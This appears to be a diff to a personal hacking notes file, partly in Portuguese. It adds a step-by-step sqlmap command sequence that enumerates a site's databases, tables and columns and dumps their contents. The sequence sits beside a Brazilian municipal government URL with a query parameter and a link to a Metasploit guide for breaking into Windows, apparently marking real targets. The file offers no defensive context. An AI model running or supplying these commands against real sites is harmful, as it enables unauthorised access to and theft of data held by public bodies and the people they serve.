@@ -4,5 +4,11 @@ https://www.youtube.com/watch?v=M2JY1_Xmokg
 https://www.youtube.com/watch?v=tSSoMDorAQ0
 http://www.boqueiraodoleao.rs.gov.br/php/secretarias.php?s=16
 
+[comandos]
+sqlmap -u [url] --dbs
+sqlmap -u [url] -D [database] --tables
+sqlmap -u [url] -D [database] -T [tabela] --Columns
+sqlmap -u [url] -D [database] -T [tabela] -C [col],[col]... --dump
+
 [metaexploit]
 https://brunoizidorio.com.br/infosec-invadindo-o-windows-usando-o-metasploit/
